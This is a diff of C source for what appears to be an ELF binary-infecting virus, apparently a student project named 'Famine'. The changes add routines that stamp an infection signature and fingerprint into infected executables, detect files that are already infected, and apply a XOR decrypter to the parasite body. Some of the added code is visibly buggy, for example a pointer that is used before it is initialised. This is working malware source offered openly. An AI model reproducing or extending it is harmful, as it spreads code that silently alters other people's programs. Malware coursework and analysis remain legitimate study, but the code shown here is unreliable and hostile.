@@ -14,6 +14,7 @@
 #include <string.h>
 
 # include <stdio.h> // DELL printfs
+# define SIZE_BEFORE_ENTRY_POINT 62
 
 typedef struct	s_file
 {
@@ -40,11 +41,15 @@ static int do_the_job(char file[],size_t size, char *path,unsigned long address_
 static int             ft_strncmp(const char *s1, const char *s2, size_t n);
 static int infect(char path[],size_t path_length, unsigned long address_of_main);
 static void new_file(char buf[],size_t size, size_t end_of_text,char *path, unsigned long address_of_main);
-static  void	ft_putnbr(int nb);
+static void	ft_putnbr(int nb);
 static void		ft_putstr(char *s);
 static int		ft_putchar(int c);
 static int     ft_isdigit(int c);
 static int ft_isallnum(char *str);
+static void	put_sig(int fd, unsigned long address_of_main);
+static bool	im_infected(char *data);
+static bool	is_infected(char *data);
+static void decrypter(unsigned long address_of_main);
 
 static char            *ft_strnstr(char *s1, char *s2, size_t n);
 static int             ft_strcmp(const char *s1, const char *s2);
@@ -662,6 +667,9 @@ static void new_file(char buf[],size_t size, size_t end_of_text,char *path, unsi
 	ft_putstr("parazite size :");
 	ft_putnbr(parasite_size);
 	ft_putstr("\n");
+	ft_putstr("put_sig\n");
+	put_sig(fd, address_of_main);
+	ft_putstr("end_put_sig\n");
 	for (int i = 0; i< PAGE_SIZE - 62-parasite_size;i++)
 		write(fd,"j",1);
 
@@ -771,6 +779,83 @@ static int             ft_strcmp(const char *s1, const char *s2)
 		index++;
 	}
 	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
+}
+
+static bool	is_infected(char *data)
+{
+	Elf64_Ehdr          *header;
+	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
+	int i;
+
+	i = 0;
+	header = (Elf64_Ehdr *)data;
+	while(sig[i])
+	{
+		if (sig[i] !=  *((char *)(header->e_entry - SIZE_BEFORE_ENTRY_POINT + i)))
+			return(0);
+		i++;
+	}
+	return(1);
+}
+
+static bool	im_infected(char *data)
+{
+	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
+	int i;
+
+	i = 0;
+	while(sig[i])
+	{
+		if (sig[i] !=  *((char *)(data - SIZE_BEFORE_ENTRY_POINT + i)))
+			return(0);
+		i++;
+	}
+	return(1);
+}
+
+static void	put_sig(int fd, unsigned long address_of_main)
+{
+	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
+	char fingerprint[] = {'0','0','0','0','0','0','0','0'};
+	int i;
+
+	*(long long *)fingerprint = *(long long *)&_start - SIZE_BEFORE_ENTRY_POINT + 54;
+	i = 7;
+	while(i >= 0)
+	{
+		if(fingerprint[i] == '9')
+		{
+			fingerprint[i] = '0';
+		}
+		else
+		{
+			fingerprint[i]++;
+			break;
+		}
+		i--;
+	}
+	write(fd,sig, sizeof(sig));
+	write(fd,fingerprint, sizeof(fingerprint));
+}
+
+static void decrypter(unsigned long address_of_main)
+{
+	size_t	size;
+	size_t	offset;
+	char	*start;
+
+	offset = *(int *)(address_of_main - 4 + sizeof(offset));
+	size = *(int *)(address_of_main - 4);
+	if(size && im_infected(address_of_main))
+	{
+		start[offset] ^= *(int *)(address_of_main - 4);
+		offset++;
+		while (offset < size)
+		{
+			start[offset] ^= start[offset - 1];
+			offset++;
+		}
+	}
 }
 
 void end_code() {
